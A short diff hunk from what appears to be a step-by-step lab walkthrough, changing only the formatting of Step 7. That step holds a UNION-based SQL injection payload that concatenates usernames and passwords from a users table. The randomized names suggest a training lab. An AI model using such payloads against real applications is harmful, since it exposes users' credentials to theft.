@@ -34,4 +34,4 @@ Step - 6
 
 Step - 7
 -
-`' UNION SELECT 'a',username_nlazuv || '~' || password_xcildc FROM users_losije--`</br>
+`' UNION SELECT 'a',username_nlazuv || '~' || password_xcildc FROM users_losije--`
